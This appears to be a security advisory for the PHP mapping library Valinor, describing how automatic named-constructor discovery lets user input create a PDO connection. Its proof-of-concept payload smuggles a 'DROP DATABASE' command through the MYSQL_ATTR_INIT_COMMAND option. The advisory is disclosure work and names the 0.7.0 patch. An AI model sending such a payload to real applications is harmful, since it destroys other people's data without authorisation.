title: "Automatic named constructor discovery in Valinor"
description: "## Design issue - automatic constructor discovery\n\nThe issue arises
  when upgrading from `cuyz/valinor:0.3.0` to a newer system on an existing application,
  which broke due to the wrong constructor being picked.\n\nStill, a bigger security
  concern is problematic, and it is akin to https://github.com/rails/rails/issues/5228.\n\n##
  Example exploit\n\nTake following DTO example:\n\n```php\nfinal class UserDTO\n{\n
  \ public function __construct(\n    public int $id,\n    public string $name\n  )
  {}\n  public static function fromDb(\n    PDO $connection,\n    int $id\n  ): self
  { /* ... code to fetch the DTO here ... */ }\n}\n```\n\nThere is nothing inherently
  unsafe about the above `UserDTO`, but when mixed with `cuyz/valinor:^0.5.0` ( specifically
  https://github.com/CuyZ/Valinor/commit/718d3c1bc2ea7d28b4b1f6c062addcd1dde8660b
  ), it is an explosive mix:\n\n```php\n// this could be coming from user input:\n$maliciousPayload
  = [\n  'connection' => [\n   'dsn' => 'mysql:host=some-host;database=some-database',\n
  \  'username' => 'root',\n   'password' => 'root',\n   'options' => [\n    // PDO::MYSQL_ATTR_INIT_COMMAND
  === 1002\n    1002 => 'DROP DATABASE all-the-moneys'\n   ]\n  ],\n  'id' => 123,\n];\n\n$treeMapper->map(\n
  UserDTO::class,\n $maliciousPayload\n); // your DB is gone :D\n```\n\nThe above
  payload is represented in PHP form, but may as well be input JSON, HTML or x-form-urlencoded.\n\n##
  Mitigation\n\nVersion 0.7.0 contains a patch for this issue.\n\nAutomatic named
  constructor resolution should be disabled - only explicitly mapped named constructors
  should be used/discovered."
